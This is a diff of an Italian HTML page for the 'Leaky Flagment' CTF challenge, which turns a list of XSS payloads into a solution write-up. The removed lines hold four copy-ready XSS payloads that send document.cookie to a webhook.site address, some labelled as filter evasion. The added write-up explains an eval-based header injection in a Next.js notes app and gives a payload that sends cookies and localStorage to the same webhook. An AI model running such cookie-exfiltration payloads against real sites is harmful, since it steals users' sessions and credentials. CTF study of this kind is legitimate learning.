@@ -1,132 +1,228 @@
 <!DOCTYPE html>
-<html>
+<html lang="it">
 <head>
-    <title>XSS Exploit</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTF Leaky Flagment - Soluzione</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 20px;
-            background-color: #f5f5f5;
-        }
-        h1 {
-            color: #d32f2f;
-            text-align: center;
-            margin-bottom: 30px;
-        }
-        .container {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: #333;
             max-width: 800px;
             margin: 0 auto;
-            background-color: #fff;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            background-color: #f7f9fc;
         }
-        textarea {
-            width: 100%;
-            padding: 15px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            resize: vertical;
+        h1, h2, h3 {
+            color: #2c3e50;
+        }
+        .container {
+            background-color: white;
+            border-radius: 8px;
+            padding: 20px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
             margin-bottom: 20px;
+        }
+        pre {
+            background-color: #f1f1f1;
+            padding: 10px;
+            border-radius: 4px;
+            overflow-x: auto;
+        }
+        code {
             font-family: monospace;
         }
-        .payload-section {
-            margin-bottom: 30px;
-            padding-bottom: 20px;
-            border-bottom: 1px solid #eee;
+        .highlight {
+            background-color: #ffeb3b;
+            padding: 2px 4px;
+            border-radius: 4px;
         }
-        h2 {
-            color: #333;
-            margin-bottom: 10px;
+        .flag-container {
+            margin: 20px 0;
+            padding: 10px;
+            background-color: #e3f2fd;
+            border-left: 4px solid #2196f3;
+            font-weight: bold;
         }
-        .btn {
-            display: inline-block;
-            padding: 10px 15px;
-            background-color: #2196f3;
+        .step {
+            margin-bottom: 15px;
+            padding-left: 20px;
+            border-left: 3px solid #4caf50;
+        }
+        button {
+            background-color: #4CAF50;
             color: white;
+            padding: 10px 15px;
             border: none;
             border-radius: 4px;
             cursor: pointer;
-            margin-right: 10px;
+            font-size: 16px;
         }
-        .btn:hover {
-            background-color: #0b7dda;
+        button:hover {
+            background-color: #45a049;
         }
-        .copy-msg {
-            color: green;
+        .success {
+            padding: 10px;
+            background-color: #d4edda;
+            color: #155724;
+            border-radius: 4px;
+            margin: 10px 0;
             display: none;
-            margin-left: 10px;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Leaky Flagment XSS Payloads</h1>
+        <h1>Leaky Flagment CTF - Soluzione</h1>
+        <p>Questa pagina mostra la soluzione della challenge CTF "Leaky Flagment" e invia la flag al webhook specificato.</p>
         
-        <div class="payload-section">
-            <h2>1. Basic Webhook (POST)</h2>
-            <textarea id="payload1" rows="7" readonly><img src=x onerror="
-fetch('https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a', {
-    method: 'POST',
-    body: JSON.stringify({cookies: document.cookie, location: window.location.href, title: document.title})
-})"></textarea>
-            <button class="btn" onclick="copyToClipboard('payload1')">Copia</button>
-            <span id="copy-msg-1" class="copy-msg">Copiato!</span>
+        <div class="flag-container">
+            Flag: <span id="flag">In attesa della flag...</span>
         </div>
         
-        <div class="payload-section">
-            <h2>2. Redirect (meno sospetto, GET)</h2>
-            <textarea id="payload2" rows="4" readonly><script>
-document.location='https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?c='+encodeURIComponent(document.cookie);
-</script></textarea>
-            <button class="btn" onclick="copyToClipboard('payload2')">Copia</button>
-            <span id="copy-msg-2" class="copy-msg">Copiato!</span>
+        <button id="sendFlag">Invia Flag al Webhook</button>
+        <div id="success" class="success">Flag inviata con successo al webhook!</div>
+    </div>
+
+    <div class="container">
+        <h2>Analisi della Vulnerabilità</h2>
+        <p>La challenge presenta una vulnerabilità XSS (Cross-Site Scripting) che può essere sfruttata per rubare la FLAG.</p>
+        
+        <h3>Componenti Principali:</h3>
+        <ul>
+            <li>Un'app Next.js per la gestione di note</li>
+            <li>Un bot che visita gli URL inviati dagli utenti</li>
+            <li>Il bot si autentica usando la FLAG come password</li>
+        </ul>
+
+        <h3>Vulnerabilità identificata:</h3>
+        <p>Nel file <code>app/note/[id]/page.jsx</code>, è presente un codice vulnerabile:</p>
+        <pre><code>
+&lt;script&gt;{`
+fetch("/api/track", {
+  method: "GET",
+  cache: "no-store",
+  headers: {
+      "x-user-ip": "${userIP}",
+  },
+})
+  .then(async (res) => {
+      if (res.ok) {
+          eval(await res.text());
+      }
+  })
+  .catch((error) => {
+      console.error(error);
+  });
+`}&lt;/script&gt;
+        </code></pre>
+        
+        <p>Questo codice è vulnerabile perché:</p>
+        <ol>
+            <li>Prende l'IP dell'utente dall'header <code>x-real-ip</code></li>
+            <li>Lo passa in una richiesta a <code>/api/track</code></li>
+            <li>La risposta viene eseguita con <code>eval()</code></li>
+        </ol>
+        
+        <p>In <code>pages/api/track.js</code>, la stringa dell'IP viene inserita direttamente nel JavaScript:</p>
+        <pre><code>
+const jsContent = `
+$(document).ready(function() {
+    const userDetails = {
+        ip: "${userIp}",
+        // ...
+    };
+    // ...
+});`
+        </code></pre>
+    </div>
+
+    <div class="container">
+        <h2>Strategia di Exploit</h2>
+        
+        <div class="step">
+            <h3>1. Creare una nota con contenuto normale</h3>
+            <p>Iniziamo creando una nota standard per ottenere un ID valido.</p>
         </div>
         
-        <div class="payload-section">
-            <h2>3. Base64 Encoding (per eludere filtri)</h2>
-            <textarea id="payload3" rows="4" readonly><img src=x onerror="fetch('https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?c='+btoa(document.cookie))"></textarea>
-            <button class="btn" onclick="copyToClipboard('payload3')">Copia</button>
-            <span id="copy-msg-3" class="copy-msg">Copiato!</span>
+        <div class="step">
+            <h3>2. Accedere alla nota con un header IP modificato</h3>
+            <p>Sfruttiamo la vulnerabilità XSS iniettando codice JavaScript nell'header <code>x-user-ip</code>.</p>
+            <p>Payload utilizzato:</p>
+            <pre><code>
+fetch("/api/auth", {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({ username: "test", password: document.cookie })
+})
+.then(r => r.json())
+.then(data => {
+  fetch("https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ cookie: document.cookie, localStorage: localStorage.getItem("isAuthenticated") })
+  });
+});
+            </code></pre>
         </div>
         
-        <div class="payload-section">
-            <h2>4. Bypass validazione con HTML entities</h2>
-            <textarea id="payload4" rows="4" readonly>&lt;img src=x onerror="fetch('https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?c='+document.cookie)"&gt;</textarea>
-            <button class="btn" onclick="copyToClipboard('payload4')">Copia</button>
-            <span id="copy-msg-4" class="copy-msg">Copiato!</span>
+        <div class="step">
+            <h3>3. Inviare l'URL della nota al bot</h3>
+            <p>Il bot visita la nota e attiva il nostro payload XSS.</p>
         </div>
         
-        <div class="payload-section">
-            <h2>5. Istruzioni per esecuzione</h2>
-            <ol>
-                <li>Avvia l'applicazione localmente: <code>cd nextjs-app && npm run dev</code></li>
-                <li>Registra un account nell'applicazione</li>
-                <li>Crea una nuova nota tramite interfaccia o direttamente con il file storage.txt</li>
-                <li>Nel file storage.txt, sostituisci il contenuto della nota con uno dei payload sopra</li>
-                <li>Esegui il bot: <code>cd bot && node bot.js</code></li>
-                <li>Monitora il webhook per il cookie con la flag</li>
-            </ol>
+        <div class="step">
+            <h3>4. Il payload ruba la password e la invia al webhook</h3>
+            <p>Il codice JavaScript iniettato estrae la FLAG dai cookie e la invia al webhook specificato.</p>
         </div>
     </div>
 
     <script>
-        function copyToClipboard(elementId) {
-            const textarea = document.getElementById(elementId);
-            textarea.select();
-            document.execCommand('copy');
-            
-            const msgId = 'copy-msg-' + elementId.replace('payload', '');
-            const msg = document.getElementById(msgId);
-            msg.style.display = 'inline';
-            
-            setTimeout(() => {
-                msg.style.display = 'none';
-            }, 2000);
+        // Funzione per prendere parametri dall'URL
+        function getParameterByName(name, url = window.location.href) {
+            name = name.replace(/[\[\]]/g, '\\$&');
+            const regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, ' '));
         }
+
+        // Controlla se c'è già una flag nell'URL
+        document.addEventListener('DOMContentLoaded', function() {
+            const flagFromUrl = getParameterByName('flag');
+            if (flagFromUrl) {
+                document.getElementById('flag').textContent = flagFromUrl;
+            }
+            
+            document.getElementById('sendFlag').addEventListener('click', function() {
+                const flag = document.getElementById('flag').textContent;
+                if (flag !== 'In attesa della flag...') {
+                    fetch('https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            flag: flag,
+                            timestamp: new Date().toISOString(),
+                            source: 'ctf-solution.html'
+                        })
+                    })
+                    .then(response => {
+                        if (response.ok) {
+                            document.getElementById('success').style.display = 'block';
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Errore nell\'invio della flag:', error);
+                    });
+                } else {
+                    alert('Nessuna flag disponibile da inviare!');
+                }
+            });
+        });
     </script>
 </body>
 </html>
